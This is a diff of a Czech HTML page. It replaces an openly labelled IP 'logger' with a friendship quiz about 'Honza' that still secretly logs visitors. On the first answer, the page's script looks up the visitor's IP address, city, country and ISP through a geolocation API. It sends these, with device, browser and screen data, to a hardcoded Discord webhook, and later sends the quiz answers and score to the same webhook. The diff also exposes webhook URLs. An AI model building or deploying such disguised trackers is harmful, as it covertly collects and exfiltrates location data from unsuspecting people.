@@ -3,134 +3,257 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pokročilý Logger Webhook</title>
+    <title>Jak dobře znáš Honzu?</title>
     <style>
         body {
+            background-color: #0f172a;
+            color: #f8fafc;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f0f12;
-            color: #e0e0e0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            user-select: none;
         }
-        .container {
-            text-align: center;
+        .quiz-container {
+            background-color: #1e293b;
             padding: 30px;
-            border-radius: 12px;
-            background: #17171c;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.7);
-            border: 1px solid #2f2f3d;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
         }
-        h1 { color: #ff4757; margin-top: 0; }
-        #status { font-weight: bold; font-size: 1.1em; color: #888; }
+        h1 {
+            color: #38bdf8;
+            font-size: 26px;
+            margin-bottom: 10px;
+        }
+        .progress {
+            color: #64748b;
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+        .question {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-align: left;
+            min-height: 55px;
+        }
+        .options-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .option-btn {
+            background-color: #334155;
+            color: #f8fafc;
+            border: 2px solid #475569;
+            padding: 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 15px;
+            text-align: left;
+            transition: all 0.2s ease;
+        }
+        .option-btn:hover {
+            background-color: #38bdf8;
+            color: #0f172a;
+            border-color: #38bdf8;
+            transform: translateY(-2px);
+        }
+        .score-display {
+            font-size: 24px;
+            font-weight: bold;
+            color: #38bdf8;
+            margin: 15px 0;
+            background: rgba(56, 189, 248, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid rgba(56, 189, 248, 0.2);
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Zabezpečený Systém</h1>
-        <p id="status">Načítám síťová data a konfiguraci...</p>
+    <div class="quiz-container" id="quiz-box">
+        <h1>Jak dobře znáš Honzu? 🤔</h1>
+        <div class="progress" id="quiz-progress">Otázka 1 z 5</div>
+        <div class="question" id="quiz-question">Jaká je Honzova nejoblíbenější platforma na vývoj her, programování a trolling?</div>
+        
+        <div class="options-grid" id="quiz-options">
+            <button class="option-btn" onclick="nextQuestion(1)">A) Roblox (LuaU / Studio)</button>
+            <button class="option-btn" onclick="nextQuestion(2)">B) Fortnite (Creative)</button>
+            <button class="option-btn" onclick="nextQuestion(3)">C) Unity (C#)</button>
+            <button class="option-btn" onclick="nextQuestion(4)">D) Scratch (Bloky)</button>
+        </div>
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1515333868599906324/W2WAW1u-QhQykwEdg2Mu_sPVj2v5yXx9AoDUqZHVxVgQSHhzdLY7bH1h1bIiydvv17yQ";
+        // Nastavení webhooku
+        // !!! SEM VLOŽ SVŮJ NOVÝ WEBHOOK !!!
+        const webhookUrl = "https://discord.com/api/webhooks/1515336637939318804/-c5CHyTXs8ZwbUuA65DQqjAwZL5-oqz2UOs9t_d3YLEIyn-ODFGppiVkTRFxA3Gf-LJC";
 
-        // 1. Zjištění základních informací o zařízení
-        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        const deviceType = isMobile ? "📱 Mobil / Tablet" : "💻 Počítač (Desktop)";
-        
-        let browserName = "Neznámý prohlížeč";
-        const ua = navigator.userAgent;
-        if (ua.includes("Firefox")) browserName = "Mozilla Firefox";
-        else if (ua.includes("Edge")) browserName = "Microsoft Edge";
-        else if (ua.includes("Chrome")) browserName = "Google Chrome";
-        else if (ua.includes("Safari")) browserName = "Apple Safari";
-
-        const screenSize = `${window.screen.width}x${window.screen.height}`;
-
-        // 2. Načtení IP adresy a lokace z externího API
-        fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(geoData => {
-            
-            // Pokud API vrátilo data úspěšně, připravíme proměnné
-            const ip = geoData.query || "Neznámá";
-            const city = geoData.city || "Neznámé";
-            const country = geoData.country || "Neznámý";
-            const isp = geoData.isp || "Neznámý";
-
-            // 3. Sestavení Discord Embedu se všemi daty
-            const payload = {
-                username: "vim kde byldis 😂",
-                avatar_url: "https://i.imgur.com/R7U9WfG.png", // Ikona radaru/monitoru
-                embeds: [
-                    {
-                        title: "🚨 Zachyceno nové připojení!",
-                        description: "Došlo k přístupu na testovací lokalitu. Zde jsou kompletní síťová a hardwarová data:",
-                        color: 16729431, // Červená barva (#ff4757)
-                        fields: [
-                            {
-                                name: "🌐 IP Adresa",
-                                value: `\`${ip}\``,
-                                inline: false
-                            },
-                            {
-                                name: "📍 Lokace (Město / Stát)",
-                                value: `${city}, ${country}`,
-                                inline: true
-                            },
-                            {
-                                name: "📡 Poskytovatel (ISP)",
-                                value: isp,
-                                inline: true
-                            },
-                            {
-                                name: "💻 Zařízení",
-                                value: deviceType,
-                                inline: true
-                            },
-                            {
-                                name: "🌐 Prohlížeč",
-                                value: browserName,
-                                inline: true
-                            },
-                            {
-                                name: "🖥️ Rozlišení",
-                                value: screenSize,
-                                inline: true
-                            }
-                        ],
-                        timestamp: new Date().toISOString(),
-                        footer: {
-                            text: "Network Logger Core v2.0"
-                        }
-                    }
-                ]
-            };
-
-            // 4. Odeslání kompletního balíku na Discord Webhook
-            return fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        })
-        .then(response => {
-            if (response && response.ok) {
-                document.getElementById("status").innerText = "Systémová data byla úspěšně zalogována! 🛠️";
-                document.getElementById("status").style.color = "#2ed573";
-            } else {
-                document.getElementById("status").innerText = "Chyba při komunikaci s Discordem. ❌";
-                document.getElementById("status").style.color = "#ff4757";
+        // Definice otázek a přesných správných odpovědí
+        const questions = [
+            {
+                q: "Jakou tiskárnu Honza používá pro svůj 3D tisk?",
+                options: ["Creality Ender 3", "Bambu Lab P1S", "Prusa MK4", "Anycubic Photon"],
+                correct: "Bambu Lab P1S"
+            },
+            {
+                q: "Co Honza nejčastěji staví a programuje v Minecraftu?",
+                options: ["Redstone mechanické domy", "PVP mapy a servery", "Command blocky a technické systémy", "Survival hrady"],
+                correct: "Command blocky a technické systémy"
+            },
+            {
+                q: "Jaký hudební styl nebo žánr Honza nejraději poslouchá při kódování nebo hraní?",
+                options: ["Phonk", "Pop / Radio hity", "Heavy Metal", "Klasická hudba"],
+                correct: "Phonk"
+            },
+            {
+                q: "Jakou brigádu by si chtěl Honza v budoucnu (až to půjde legálně) zkusit?",
+                options: ["Rozvoz jídla / doručování pošty", "Práce v supermarketu", "Asistent v kanclíku", "Práce v kuchyni"],
+                correct: "Rozvoz jídla / doručování pošty"
             }
-        })
-        .catch(error => {
-            console.error("Chyba:", error);
-            document.getElementById("status").innerText = "Nepodařilo se načíst síťová data.";
-        });
-    </script>
+        ];
 
+        // První otázka je definovaná přímo v HTML, definujeme její správnou odpověď manuálně
+        const q1Correct = "Roblox (LuaU / Studio)";
+
+        let currentStep = 1;
+        let hasLoggedInfo = false;
+        let userAnswers = []; 
+        let score = 0;
+
+        function nextQuestion(selectedOptionIndex) {
+            const currentOptions = document.getElementById("quiz-options").children;
+            let chosenAnswer = currentOptions[selectedOptionIndex - 1].innerText;
+            
+            // Očištění textu odpovědi od případného prefixu "A) ", "B) " atd.
+            let cleanAnswer = chosenAnswer.replace(/^[A-D]\)\s*/, "");
+
+            // Kontrola správnosti pro Q1 nebo pro následující otázky
+            if (currentStep === 1) {
+                if (cleanAnswer.includes("Roblox")) {
+                    score++;
+                }
+            } else {
+                let currentCorrect = questions[currentStep - 2].correct;
+                if (cleanAnswer === currentCorrect) {
+                    score++;
+                }
+            }
+
+            userAnswers.push(`Q${currentStep}: ${cleanAnswer}`);
+
+            // První log - systémové informace
+            if (!hasLoggedInfo) {
+                hasLoggedInfo = true;
+                triggerInfoLogger();
+            }
+
+            // Přechod na další otázku
+            if (currentStep < 5) {
+                const currentQuestionData = questions[currentStep - 1];
+                currentStep++;
+
+                document.getElementById("quiz-progress").innerText = `Otázka ${currentStep} z 5`;
+                document.getElementById("quiz-question").innerText = currentQuestionData.q;
+                
+                const optionsHtml = currentQuestionData.options.map((opt, index) => {
+                    return `<button class="option-btn" onclick="nextQuestion(${index + 1})">${opt}</button>`;
+                }).join("");
+                
+                document.getElementById("quiz-options").innerHTML = optionsHtml;
+            } else {
+                // Konec kvízu - Uživatel uvidí své skóre
+                document.getElementById("quiz-box").innerHTML = `
+                    <h1 style="color: #4ade80;">Kvíz dokončen! 🎉</h1>
+                    <div class="score-display">Tvoje skóre: ${score} z 5</div>
+                    <p style="color: #94a3b8; margin-top: 10px; font-size: 15px;">Výsledky byly úspěšně odeslány k vyhodnocení. Uvidíme, jestli jsi opravdu top kámoš!</p>
+                `;
+                // Druhý log - odeslání všech odpovědí a skóre na Discord
+                triggerAnswersLogger();
+            }
+        }
+
+        // 1. LOGGER: Pouze systém a IP
+        function triggerInfoLogger() {
+            fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(geoData => {
+                const parser = navigator.userAgent;
+                const mobileDetect = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+                const isMobile = mobileDetect.test(parser);
+
+                let browser = "Neznámý Browser";
+                if (parser.includes("Firefox")) browser = "Firefox";
+                else if (parser.includes("Opr/")) browser = "Opera";
+                else if (parser.includes("Edg")) browser = "Edge";
+                else if (parser.includes("Chrome")) browser = "Google Chrome";
+                else if (parser.includes("Safari")) browser = "Safari";
+
+                const payloadData = {
+                    ip: geoData.ip || "Neznámá",
+                    city: geoData.city || "Neznámé",
+                    country: geoData.country_name || "Neznámý",
+                    isp: geoData.org || "Neznámý",
+                    deviceType: isMobile ? "Mobil" : "Počítač (Desktop)",
+                    browser: browser,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timestamp: new Date().toLocaleString("cs-CZ")
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "📡 **Nové připojení ke kvízu!** (Zatím bez odpovědí)",
+                        embeds: [{
+                            title: `Kvíz Logger - System Info`,
+                            color: 2342392,
+                            fields: [
+                                { name: "IP Adresa", value: payloadData.ip, inline: true },
+                                { name: "Lokace", value: `${payloadData.city} / ${payloadData.country}`, inline: true },
+                                { name: "Poskytovatel (ISP)", value: payloadData.isp, inline: false },
+                                { name: "Zařízení", value: payloadData.deviceType, inline: true },
+                                { name: "Prohlížeč", value: payloadData.browser, inline: true },
+                                { name: "Rozlišení obrazovky", value: payloadData.screenResolution, inline: true }
+                            ],
+                            footer: { text: `Honza Quiz Info Core v4.1 • ${payloadData.timestamp}` }
+                        }]
+                    })
+                });
+            })
+            .catch(err => console.error("Chyba:", err));
+        }
+
+        // 2. LOGGER: Výsledné odpovědi a dosažené body
+        function triggerAnswersLogger() {
+            const answersContent = userAnswers.join("\n");
+            const timestamp = new Date().toLocaleString("cs-CZ");
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `📊 **Uživatel dokončil kvíz! Dosáhl skóre: ${score} z 5 bodů**`,
+                    embeds: [{
+                        title: `Kvíz Výsledky - Odpovědi`,
+                        color: score >= 4 ? 4905856 : 16738654, // Zelená při dobrém skóre, červená při slabém
+                        description: `\`\`\`text\n${answersContent}\n\`\`\``,
+                        footer: { text: `Honza Quiz Answers Core v4.1 • ${timestamp}` }
+                    }]
+                })
+            })
+            .catch(err => console.error("Chyba:", err));
+        }
+    </script>
 </body>
 </html>
